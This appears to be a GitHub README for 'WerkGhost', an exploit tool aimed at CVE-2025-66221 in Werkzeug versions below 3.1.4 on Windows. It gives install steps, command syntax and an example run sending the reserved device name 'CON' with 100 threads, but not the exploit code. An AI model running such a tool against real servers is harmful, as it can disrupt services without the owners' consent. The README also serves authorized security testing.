# WerkGhost

<img width="636" height="219" alt="image" src="https://github.com/user-attachments/assets/596eca60-a2d9-4aa3-9f4e-ad8b98779e29" />

Exploit for Werkzeug &lt; 3.1.4 (CVE-2025-66221)

# Disclaimer
This script is provided solely for controlled security testing and research purposes. It must only be used on systems and environments for which you have explicit, written authorization. Any use outside of legally sanctioned testing — including against third-party, public, or production systems — is strictly prohibited and may violate local and international laws. You assume full responsibility for all actions taken with this tool. The author accepts no liability for misuse, damages, service disruption, or legal consequences arising from unauthorized activity.

# Requirements
You have to install [requests](https://pypi.org/project/requests/) before start using the script.
```bash
pip install requests 
```

# Usage
```bash
python werkghost.py -u <url> -p <payload> -d <Directory> --timeout <timeout :D> -t <threads>
```

# Example
```bash
python werkghost.py -u http://127.0.0.1:8000 -p CON -d download --timeout 3 -t 100
```

**Note**: 
- The target web server must be running on Windows.
- If the operation fails or produces inconsistent results, increase the number of worker threads and retry.
